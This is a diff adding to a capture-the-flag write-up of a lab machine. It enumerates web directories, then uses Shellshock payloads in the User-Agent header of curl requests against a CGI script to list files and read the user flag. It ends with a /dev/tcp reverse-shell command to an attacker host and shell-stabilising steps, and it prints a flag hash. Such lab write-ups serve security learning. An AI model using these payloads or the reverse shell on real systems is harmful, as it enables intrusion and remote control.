@@ -24,3 +24,69 @@ PORT     STATE SERVICE VERSION
 |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
+Running dirb tool 
+```
+dirb http://10.10.10.56/  
+
+http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                  
+http://10.10.10.56/index.html (CODE:200|SIZE:137) 
+```
+
+Noting the name of the box, I can tell this is going to be a shellshock vunerability with the cgi-bin directory its a given! 
+
+/cgi-bin/
+```
+gobuster dir -u http://10.10.10.56/cgi-bin/ -w  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt    -t 30 -x .txt,.html,.php,.bk,.gz,.png,.sh -s 403,200
+
+/user.sh              (Status: 200) [Size: 118]
+```
+
+## ShellShock
+
+- Basic usage (Exploit)
+
+
+
+```
+curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/ls"
+```
+```
+user.sh
+```
+
+Lets get the user of the box in /home
+
+```
+curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/ls /home"
+```
+```
+shelly
+```
+
+We can get the user flag now then work on getting on the box properly via a reverse shell 
+
+```
+curl -v http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/cat /home/shelly/user.txt"
+```
+
+Flag
+```
+beb558c0c62831ab277c9da1ce663157
+```
+
+## Reverse Shell
+
+```
+curl -v http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/sh -i >& /dev/tcp/10.10.14.184/9999 0>&1"
+```
+```
+stty raw -echo;fg
+reset
+xterm
+export TERM=xterm
+export SHELL=bash
+```
+
+
+
